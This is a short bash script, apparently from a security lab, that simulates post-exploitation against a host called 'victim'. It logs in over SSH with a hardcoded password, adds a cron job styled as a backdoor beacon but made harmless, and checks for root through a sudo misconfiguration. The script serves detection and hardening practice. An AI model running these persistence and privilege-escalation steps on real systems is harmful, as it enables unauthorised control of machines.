#!/bin/bash
# ATTACK 3 — Post-exploitation: Persistence + Privilege Escalation
# Now that the attacker has valid creds (from Attack 2), they log in and:
#   (a) PERSISTENCE  — install a malicious cron job  (T1053.003: Scheduled Task/Job: Cron)
#   (b) PRIVESC      — abuse a sudo misconfig to become root (T1548.003: Sudo)
# Both actions are driven over SSH from the attacker box.
set -u
TARGET="${1:-victim}"
PASS="password123"

echo "[*] (a) Installing a malicious cron job for persistence..."
# A cron job that would 'phone home' every minute. We make it benign (echo) but it is
# structured exactly like a real backdoor beacon so detection logic is realistic.
sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no alice@"$TARGET" \
  "(crontab -l 2>/dev/null; echo '* * * * * /bin/bash -c \"echo beacon \$(date) >> /tmp/.beacon\"') | crontab -"
echo "    -> cron job installed for user alice."

echo "[*] (b) Attempting privilege escalation via sudo..."
# The hardening phase later removes alice's unrestricted sudo. Before that, if alice
# can run any command as root, 'sudo id' prints uid=0(root) — the escalation proof.
sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no alice@"$TARGET" \
  "echo '$PASS' | sudo -S id 2>&1 | head -1" || echo "    -> sudo not permitted (good, if already hardened)"

echo "[*] Post-exploitation complete."
